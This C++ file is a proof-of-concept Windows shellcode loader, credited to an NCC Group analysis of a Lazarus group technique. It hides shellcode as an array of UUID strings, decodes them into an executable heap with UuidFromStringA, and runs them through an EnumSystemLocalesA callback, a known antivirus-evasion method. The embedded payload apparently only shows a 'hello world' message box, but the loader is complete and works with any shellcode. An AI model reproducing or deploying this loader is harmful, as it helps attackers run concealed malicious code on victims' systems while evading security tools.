// Stolen from: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/

#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    "d99bebd9-2474-31f4-d2b2-7731c9648b71",
    "0c768b30-768b-8b1c-4608-8b7e208b3638",
    "f375184f-0159-ffd1-e160-8b6c24248b45",
    "28548b3c-0178-8bea-4a18-8b5a2001ebe3",
    "348b4934-018b-31ee-ff31-c0fcac84c074",
    "0dcfc107-c701-f4eb-3b7c-242875e18b5a",
    "66eb0124-0c8b-8b4b-5a1c-01eb8b048b01",
    "244489e8-611c-b2c3-0829-d489e589c268",
    "ec0e4e8e-e852-ff9f-ffff-894504bb7ed8",
    "1c8773e2-5224-8ee8-ffff-ff894508686c",
    "6841206c-3233-642e-6875-73657230db88",
    "890a245c-56e6-55ff-0489-c250bba8a24d",
    "241c87bc-e852-ff5f-ffff-686f78582068",
    "42656761-4d68-7365-7331-db885c240a89",
    "6c7268e3-5864-6f68-2077-6f6868656c6c",
    "4c88c931-0b24-e189-31d2-52535152ffd0",
    "ff50c031-0855-0000-0000-000000000000"
};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}